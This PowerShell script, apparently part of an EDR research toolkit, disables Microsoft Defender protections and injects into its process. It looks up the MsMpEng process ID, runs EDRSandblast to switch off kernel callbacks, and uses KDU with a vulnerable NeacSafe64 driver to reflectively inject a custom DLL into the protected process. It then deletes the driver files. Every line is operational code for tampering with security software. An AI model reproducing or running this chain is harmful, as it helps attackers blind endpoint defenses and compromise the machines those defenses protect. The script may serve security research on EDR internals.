$root = "$PSScriptRoot\.."
$rel = "$root\x64\Release"
$injectLoader = "$rel\InjectLoader.exe"
$monitorDLL = "$rel\EDRReflectiveHooker.dll"

$mdePID = (Get-Process -Name "MsMpEng").ID

# start ETW parser for hooks
$ETWDump = "$rel\ETWDump.exe"
Start-Process $ETWDump -Args "Hooks"

$_ = Read-Host "[*] Press ENTER to disable callbacks"

# disable callbacks
$edrSandblast = "$root\helpers\EDRSandblast\EDRSandblast.exe"
$edrSandblastArgs = "toggle_callbacks 0e1 --kernelmode -i"
Start-Process $edrSandblast -Args $edrSandblastArgs

$_ = Read-Host "[*] Press ENTER when callbacks are disabled"

# params to reflectively inject 
$injArgs = "$monitorDLL $mdePID R D"
$injCMD = "$injectLoader $injArgs"

# inject DLL with PPL
$kdu = "$root\helpers\KDU\kdu.exe"
$kduArgs = "-pse `"$injCMD`" -prv 54"

Start-Process $kdu -Args $kduArgs -NoNewWindow -Wait

# KDU cleanup
rm "NeacSafe64.inf"
rm "NeacSafe64.sys"